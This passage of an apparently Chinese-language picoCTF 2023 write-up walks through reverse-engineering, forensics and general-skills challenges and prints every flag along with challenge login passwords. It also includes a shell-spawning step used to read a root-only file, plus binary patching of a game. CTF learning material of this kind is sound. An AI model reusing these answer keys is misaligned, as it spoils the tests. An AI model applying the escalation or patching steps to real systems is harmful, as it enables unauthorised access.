<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// Decompiled by Procyon v0.5.36</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeOpener</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BufferedReader</span> <span class="variable">keyboard</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedkey</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;Enter password for the safe: &quot;</span>);</span><br><span class="line">            key = keyboard.readLine();</span><br><span class="line">            encodedkey = encoder.encodeToString(key.getBytes());</span><br><span class="line">            System.out.println(encodedkey);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isOpen</span> <span class="operator">=</span> openSafe(encodedkey);</span><br><span class="line">            <span class="keyword">if</span> (isOpen) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;You have  &quot;</span> + (<span class="number">2</span> - i) + <span class="string">&quot; attempt(s) left&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">openSafe</span><span class="params">(<span class="keyword">final</span> String password)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">encodedkey</span> <span class="operator">=</span> <span class="string">&quot;picoCTF&#123;SAf3_0p3n3rr_y0u_solv3d_it_3dae8463&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (password.equals(encodedkey)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Sesame open&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Password is incorrect\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="timer"><a href="#timer" class="headerlink" title="timer"></a>timer</h2><div class="note success flat"><p>AUTHOR: LOIC SHEMA</p>
<p>Description<br>You will find the flag after analysing this apk<br>Download here.<br><strong>100 Points</strong></p>
</div>

<p>這題是個apk檔案的逆向，因為之前逆向過蠻多apk的題目了，所以就直接忽略他的Hint，顯然他的方法有點麻煩XD首先我先用apktool把apk裡面的東西輸出成資料夾：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ apktool d timer.apk</span><br><span class="line">I: Using Apktool 2.5.0-dirty on timer.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: /home/m3t30r/.local/share/apktool/framework/1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Baksmaling classes3.dex...</span><br><span class="line">I: Baksmaling classes2.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br></pre></td></tr></table></figure>

<p>接著利用<code>grep</code>在資料夾裡爆搜<code>pico</code>就能夠找到flag了:P</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r &quot;pico&quot;</span><br><span class="line">apktool.yml:  versionName: picoCTF&#123;t1m3r_r3v3rs3d_succ355fully_17496&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Virtual-Machine-0"><a href="#Virtual-Machine-0" class="headerlink" title="Virtual Machine 0"></a>Virtual Machine 0</h2><div class="note warning flat"><p>AUTHOR: LT ‘SYREAL’ JONES</p>
<p>Description<br>Can you crack this black box?<br>We grabbed this design doc from enemy servers: Download. We know that the rotation of the red axle is input and the rotation of the blue axle is output. The following input gives the flag as output: Download.<br><strong>100 Points</strong></p>
</div>

<p>這題其實是一個蠻詭異的題目，他給了一個<code>.dae</code>檔案，他是一個3D建模常見的輸出檔案，所以可以用Blender開(要不是平常有在亂玩Blender我根本不知道要怎麼開.w.)。打開之後會發現一個黑盒子：</p>
<p><img src="https://i.imgur.com/MgLa2mT.png"></p>
<p>而題目說紅色桿子是輸入，藍色桿子是輸出，那麼我們來看一下裡面的運作吧，把外面的黑盒子部分刪掉之後：</p>
<p><img src="https://i.imgur.com/ESggklE.png"></p>
<p>可以發現裡面是樂高齒輪的形狀，有碰過樂高的齒輪就可以很輕易的判斷出紅色的是40齒的齒輪，而藍色和灰色是8齒(或者是也可以慢慢數啦XD)，因此紅色轉1圈時，藍色會轉5圈。這時代入他給我們的input，把他轉成byte形式就可以拿到flag了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from Crypto.Util.number import *</span><br><span class="line">&gt;&gt;&gt; inp=39722847074734820757600524178581224432297292490103996085769154356559546905</span><br><span class="line">&gt;&gt;&gt; long_to_bytes(inp*5)</span><br><span class="line">b&#x27;picoCTF&#123;g34r5_0f_m0r3_c133eae2&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>P.S.這題這麼少人解應該是因為不知道<code>.dae</code>到底是什麼XD</p>
<h2 id="No-way-out"><a href="#No-way-out" class="headerlink" title="No way out"></a>No way out</h2><div class="note warning flat"><p>AUTHOR: KRIS</p>
<p>Description<br>Put this flag in standard picoCTF format before submitting. If the flag was <code>h1_1m_7h3_f14g</code> submit <code>picoCTF{h1_1m_7h3_f14g}</code> to the platform.<br>Windows game, Mac game<br><strong>200 Points</strong></p>
</div>

<p>P.S.今年的reverse都是我有在用的軟體，讚啦</p>
<p><img src="https://i.imgur.com/A8umM5R.jpg"></p>
<p>這題是一個unity遊戲，進去之後會有一個第一人稱的Controller，可以亂爬，但是外面的牆擋住了，不讓使用者出去。從題目看起來應該是出去之後就可以拿到flag了，外面也有一個高高的flag在那邊，所以可想而知，要從patch下手。unity本身是一個利用C#控制的程式，所以可以利用dnSpy來逆向，開發者自己編寫的語言會儲存在<code>Assembly-CSharp.dll</code>裡面。用dnSpy打開他：</p>
<p><img src="https://i.imgur.com/hN9Sl1s.png"></p>
<p>因為我們是被關住，所以直覺就是往First Person Controller被限制去想，翻一下<code>Player Controller</code>的code可以發現下面這個東西：</p>
<p><img src="https://i.imgur.com/DX7PBJa.png"></p>
<p>他的if條件式裡面出現了有關<code>isGrounded</code>的bool判斷，因此想法就是把他patch掉，這樣或許我們就可以不受unity遊戲中牆壁與跳躍的限制。利用dnSpy把if中的<code>isGrounded</code>通通patch掉之後，再次運行遊戲。</p>
<p><img src="https://i.imgur.com/f6wVKqH.jpg"></p>
<p>這個時候我們的跳躍限制就解除了，甚至可以飛(?)。然後就會發現飛到flag的頂端之後，flag就會跑出來了XD神奇的設計：）</p>
<h2 id="Ready-Gladiator-1"><a href="#Ready-Gladiator-1" class="headerlink" title="Ready Gladiator 1"></a>Ready Gladiator 1</h2><div class="note warning flat"><p>AUTHOR: LT ‘SYREAL’ JONES</p>
<p>Description<br>Can you make a CoreWars warrior that wins?<br>Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:<br><code>nc saturn.picoctf.net 58681 &lt; imp.red</code><br>To get the flag, you must beat the Imp at least once out of the many rounds.<br><strong>200 Points</strong></p>
</div>

<p>這題跟前面的類型是一樣的，差別只是在他要求我們至少要贏一次。可想而知又是從<code>imp.red</code>動手腳，而Hint裡面說我們可以在beginner docs裡面找到可用的warrior，所以我們就去<a target="_blank" rel="noopener" href="https://vyznev.net/corewar/guide.html">這裡</a>找找看，而在裡面發現了一個Dwarf的模型，馬上來試試看。以下是<code>imp.red</code>的內容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cat imp.red</span><br><span class="line">;redcode</span><br><span class="line">;name Imp Ex</span><br><span class="line">;assert 1</span><br><span class="line">ADD #4, 3</span><br><span class="line">MOV 2, @2</span><br><span class="line">JMP -2</span><br><span class="line">DAT #0, #4</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>執行後就可以拿到flag了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ nc saturn.picoctf.net 58681 &lt; imp.red</span><br><span class="line">;redcode</span><br><span class="line">;name Imp Ex</span><br><span class="line">;assert 1</span><br><span class="line">ADD #4, 3</span><br><span class="line">MOV 2, @2</span><br><span class="line">JMP -2</span><br><span class="line">DAT #0, #4</span><br><span class="line">end</span><br><span class="line">Submit your warrior: (enter &#x27;end&#x27; when done)</span><br><span class="line"></span><br><span class="line">Warrior1:</span><br><span class="line">;redcode</span><br><span class="line">;name Imp Ex</span><br><span class="line">;assert 1</span><br><span class="line">ADD #4, 3</span><br><span class="line">MOV 2, @2</span><br><span class="line">JMP -2</span><br><span class="line">DAT #0, #4</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">Rounds: 100</span><br><span class="line">Warrior 1 wins: 26</span><br><span class="line">Warrior 2 wins: 0</span><br><span class="line">Ties: 74</span><br><span class="line">You did it!</span><br><span class="line">picoCTF&#123;1mp_1n_7h3_cr055h41r5_441be1fc&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Virtual-Machine-1"><a href="#Virtual-Machine-1" class="headerlink" title="Virtual Machine 1"></a>Virtual Machine 1</h2><div class="note danger flat"><p>AUTHOR: LT ‘SYREAL’ JONES</p>
<p>Description<br>The enemy has upgraded their mechanical analog computer. Start an instance to begin.<br>We grabbed this design doc from enemy servers: Download. We know that the rotation of the red axle is input and the rotation of the blue axle is output. Reverse engineer the mechanism and get past their checker program:<br><code>nc saturn.picoctf.net 63883</code><br><strong>300 Points</strong></p>
</div>

<p>這一題是剛剛Virtual Machine 0的進階版，其實不難但是非常麻煩，我們一樣用blender打開他：</p>
<p><img src="https://i.imgur.com/722U5Op.png"></p>
<p>這次是個複雜到爆炸的齒輪，一樣紅色作為輸入，藍色作為輸出，但中間經過了三個階段的齒輪設計，除了一般齒輪之外中間還安插了一種特別的轉輪。</p>
<p><img src="https://i.imgur.com/y0yYEr1.png"></p>
<p>這個東西稱為差速器，是齒輪設計時為了避免轉速不一所設計的物件，當兩邊的輸入轉速不一樣時，這個差速器的輸出轉速將會是$\dfrac{1}{2}($左轉速+右轉速$)$，經由這個理論就能用數的將這個題目完成了，數完的結果會是$output=input\times7\times191\times7=input\times9359$，此時再連進nc輸入結果即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ nc saturn.picoctf.net 63883</span><br><span class="line">If the input to the machine is 4347, what is the output?</span><br><span class="line">Answer&gt; 40683573</span><br><span class="line">40683573</span><br><span class="line">That&#x27;s correct!</span><br><span class="line">picoCTF&#123;m0r3_g34r5_3g4d_2efa1d52&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Ready-Gladiator-2"><a href="#Ready-Gladiator-2" class="headerlink" title="Ready Gladiator 2"></a>Ready Gladiator 2</h2><div class="note danger flat"><p>AUTHOR: LT ‘SYREAL’ JONES</p>
<p>Description<br>Can you make a CoreWars warrior that wins every single round?<br>Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:<br><code>nc saturn.picoctf.net 53774 &lt; imp.red</code><br>To get the flag, you must beat the Imp all 100 rounds.<br><strong>400 Points</strong></p>
</div>

<p>這題是這個類別裡我最後解掉的題目，但也是讓我覺得最通靈的題目，這次的要求是要讓我們的warrior 100連勝，這從我們前面的write up看起來幾乎是不可能的事，網路上也沒有相關的文件說明這件事情，因此我決定從基本的指令下手，畢竟picoCTF不太可能讓我們寫一段冗長的redcode(吧)。看看以下這個說明：</p>
<p><img src="https://i.imgur.com/ZQbNrZc.png"></p>
<p>再看看Hint說當warrior靠近時，再做一次會進行子程序，一開始我並不知道這個提示究竟想表達什麼.w.但後來對照一下，發現他跟<code>JMP</code>這個指令似乎有密切的關係，<code>JMP</code>代表著跳躍到另一個位置，那我們來試試看這樣是不是能閃躲另一個warrior的攻擊。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat imp.red</span><br><span class="line">;redcode</span><br><span class="line">;name Imp Ex</span><br><span class="line">;assert 1</span><br><span class="line">jmp 0, 3</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>試了好幾種方法，似乎還是拿不到flag，但後來又<a target="_blank" rel="noopener" href="https://corewar-docs.readthedocs.io/en/latest/redcode/opcodes/#jmp-jump">在這裡</a>發現了Addressing Modes的東西，亂試了一下，發現試了一輪還是不行。後來過了幾天異想天開，想說負數不知道可不可以，結果亂試了一下，就中了OAO打picoCTF果然需要一點通靈.w.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ nc saturn.picoctf.net 52306 &lt; imp.red</span><br><span class="line">;redcode</span><br><span class="line">;name Imp Ex</span><br><span class="line">;assert 1</span><br><span class="line">jmp 0, &lt;-3</span><br><span class="line">end</span><br><span class="line">Submit your warrior: (enter &#x27;end&#x27; when done)</span><br><span class="line"></span><br><span class="line">Warrior1:</span><br><span class="line">;redcode</span><br><span class="line">;name Imp Ex</span><br><span class="line">;assert 1</span><br><span class="line">jmp 0, &lt;-3</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">Rounds: 100</span><br><span class="line">Warrior 1 wins: 100</span><br><span class="line">Warrior 2 wins: 0</span><br><span class="line">Ties: 0</span><br><span class="line">You did it!</span><br><span class="line">picoCTF&#123;d3m0n_3xpung3r_9a074a57&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><p>這個類別一直以來都是picoCTF中數一數二通靈的，今年也不例外。但其實題目素質有變好，不過我沒解出的兩題真的太通了，完全通不到= =只能說沒有靈異體質千萬不要打CTF(X</p>
<h2 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h2><div class="note success flat"><p>AUTHOR: GEOFFREY NJOGU</p>
<p>Description<br>Every file gets a flag.<br>The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what meets the eye here.<br><strong>100 Points</strong></p>
</div>

<p>這題是個簡單的圖片隱寫術，給了一張picoCTF的logo，用一些工具簡單處理一下，可以發現一點端倪。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk flag.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 512 x 504, 8-bit/color RGBA, non-interlaced</span><br><span class="line">41            0x29            Zlib compressed data, compressed</span><br><span class="line">39739         0x9B3B          Zip archive data, at least v1.0 to extract, name: secret/</span><br><span class="line">39804         0x9B7C          Zip archive data, at least v2.0 to extract, compressed size: 2869, uncompressed size: 3024, name: secret/flag.png</span><br><span class="line">42908         0xA79C          End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>

<p>裡面有個zip，用工具解出來之後就能看到flag了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ foremost flag.png</span><br><span class="line">Processing: flag.png</span><br><span class="line">|foundat=secret/UT</span><br><span class="line">foundat=secret/flag.pngUT</span><br><span class="line">*|</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/Bqt5Xkw.png"></p>
<h2 id="PcapPoisoning"><a href="#PcapPoisoning" class="headerlink" title="PcapPoisoning"></a>PcapPoisoning</h2><div class="note success flat"><p>AUTHOR: MUBARAK MIKAIL</p>
<p>Description<br>How about some hide and seek heh?<br>Download this file and find the flag.<br><strong>100 Points</strong></p>
</div>

<p>這題我也覺得很爛，我用wireshark在那邊分析了pcap半天，也沒分析出什麼東西，還有一堆奇怪的host，結果<code>strings</code>一下就找到了= =</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ strings trace.pcap | grep pico</span><br><span class="line">picoCTF&#123;P64P_4N4L7S1S_SU55355FUL_31010c46&#125;F~</span><br></pre></td></tr></table></figure>

<h2 id="who-is-it"><a href="#who-is-it" class="headerlink" title="who is it"></a>who is it</h2><div class="note success flat"><p>AUTHOR: JUNIAS BONOU</p>
<p>Description<br>Someone just sent you an email claiming to be Google’s co-founder Larry Page but you suspect a scam.<br>Can you help us identify whose mail server the email actually originated from?<br>Download the email file here. Flag: <code>picoCTF{FirstnameLastname}</code><br><strong>100 Points</strong></p>
</div>

<p>這題其實算是個簡單的OSINT，題目給了一個<code>.eml</code>檔，要查出是誰的server寄發了這份郵件。首先先用線上工具分析一下裡面的內容。</p>
<p><img src="https://i.imgur.com/w83VghY.png"></p>
<p>可以很清楚的看到他的IP，題目又說whois很好用，那當然是用來試試看囉，打完之後就可以看到我們要的東西了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ whois 173.249.33.206</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># ARIN WHOIS data and services are subject to the Terms of Use</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">person:         Wilhelm Zwalina</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="FindAndOpen"><a href="#FindAndOpen" class="headerlink" title="FindAndOpen"></a>FindAndOpen</h2><div class="note success flat"><p>AUTHOR: MUBARAK MIKAIL</p>
<p>Description<br>Someone might have hidden the password in the trace file.<br>Find the key to unlock this file. This tracefile might be good to analyze.<br><strong>100 Points</strong></p>
</div>

<p>這題其實也蠻通靈的，一樣是pcap分析不出什麼東西，然後用<code>strings</code>就找到了一個像base64的東西，但輸進去之後卻轉不出來，原因是因為填充位數不對，因此在前面多加幾個字元就能看到secret。</p>
<p><img src="https://i.imgur.com/0Q3YB0k.png"></p>
<p>用這個secret就能打開zip獲得完整的flag了。</p>
<p><img src="https://i.imgur.com/5uiig6S.png"></p>
<h2 id="MSB"><a href="#MSB" class="headerlink" title="MSB"></a>MSB</h2><div class="note warning flat"><p>AUTHOR: LT ‘SYREAL’ JONES</p>
<p>Description<br>This image passes LSB statistical analysis, but we can’t help but think there must be something to the visual artifacts present in this image…<br>Download the image here<br><strong>200 Points</strong></p>
</div>

<p>這題題目都說是MSB了，那當然就是用MSB的方法解囉～stegsolve馬上打開來試試。</p>
<p><img src="https://i.imgur.com/iCPzgB6.png"></p>
<p>結果在RGB全開的情況下獲得了明文，把txt檔載下來之後搜尋<code>pico</code>即可找到flag。</p>
<p><img src="https://i.imgur.com/uhZQqLr.png"></p>
<h1 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h1><blockquote>
<p>CLEAR</p>
</blockquote>
<p>這個類別是我第二個破台的類別，今年的General Skills比往年都難，開始有接近一般MISC的感覺了，一起來看看怎麼解這些看似最簡單的題目吧XD</p>
<h2 id="chrono"><a href="#chrono" class="headerlink" title="chrono"></a>chrono</h2><div class="note success flat"><p>AUTHOR: MUBARAK MIKAIL</p>
<p>Description<br>How to automate tasks to run at intervals on linux servers?<br>Additional details will be available after launching your challenge instance.<br><strong>100 Points</strong></p>
</div>

<p>這題其實應該算是出爛了，ssh連進去之後往根目錄裡面的<code>/challenge/metadata.json</code>就可以找到flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ssh picoplayer@saturn.picoctf.net -p 49904</span><br><span class="line">picoplayer@saturn.picoctf.net&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-1031-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line">Last login: Thu Mar 30 05:11:26 2023 from 114.36.17.55</span><br><span class="line">picoplayer@challenge:~$ cat /challenge/metadata.json</span><br><span class="line">&#123;&quot;flag&quot;: &quot;picoCTF&#123;Sch3DUL7NG_T45K3_L1NUX_7754e199&#125;&quot;, &quot;username&quot;: &quot;picoplayer&quot;, &quot;password&quot;: &quot;a-8nJGZCTa&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="money-ware"><a href="#money-ware" class="headerlink" title="money-ware"></a>money-ware</h2><div class="note success flat"><p>AUTHOR: JUNI19</p>
<p>Description<br>Flag format: picoCTF{Malwarename}<br>The first letter of the malware name should be capitalized and the rest lowercase.<br>Your friend just got hacked and has been asked to pay some bitcoins to <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code>. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of?<br><strong>100 Points</strong></p>
</div>

<p>這題是簡單的OSINT，上網找一下那串奇怪的編碼就能找到那個malware的名字了。</p>
<p><img src="https://i.imgur.com/cRgTioD.png"></p>
<h2 id="Permissions"><a href="#Permissions" class="headerlink" title="Permissions"></a>Permissions</h2><div class="note success flat"><p>AUTHOR: GEOFFREY NJOGU</p>
<p>Description<br>Can you read files in the root file?<br>Additional details will be available after launching your challenge instance.<br><strong>100 Points</strong></p>
</div>

<p>這題需要一點通靈，因為我們原本的使用者是<code>picoplayer</code>，所以沒有讀取flag的權限，但我們可以動一點小手腳，像是<code>/bin/sh</code>等，這樣可以讓我們用root權限讀取任何檔案，也就能成功得到flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -p 55977 picoplayer@saturn.picoctf.net</span><br><span class="line">picoplayer@saturn.picoctf.net&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-1031-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line">Last login: Thu Mar 30 05:27:26 2023 from 114.36.17.55</span><br><span class="line">picoplayer@challenge:~$ /bin/sh</span><br><span class="line">$ cat /challenge/metadata.json</span><br><span class="line">&#123;&quot;flag&quot;: &quot;picoCTF&#123;uS1ng_v1m_3dit0r_021d10ab&#125;&quot;, &quot;username&quot;: &quot;picoplayer&quot;, &quot;password&quot;: &quot;dLAqMvm7xv&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="repetitions"><a href="#repetitions" class="headerlink" title="repetitions"></a>repetitions</h2><div class="note success flat"><p>AUTHOR: THEONESTE BYAGUTANGAZA</p>
<p>Description<br>Can you make sense of this file?<br>Download the file here.<br><strong>100 Points</strong></p>
</div>

<p>這題很明顯是base64編碼，看題目應該是編碼了不少次，所以把他拉到CyberChef裡面試試看多次解碼就可以得到flag了。</p>
<p><img src="https://i.imgur.com/0vjDFin.png"></p>
<p>P.S. 看起來是被編碼了6次.w.</p>
<h2 id="useless"><a href="#useless" class="headerlink" title="useless"></a>useless</h2><div class="note warning flat"><p>AUTHOR: LOIC SHEMA</p>
<p>Description<br>There’s an interesting script in the user’s home directory<br>Additional details will be available after launching your challenge instance.<br><strong>100 Points</strong></p>
</div>

<p>這題其實我還是搞不懂他到底是在幹嘛，一開始他給了一個sh檔案，看起來是個簡單計算機。</p>
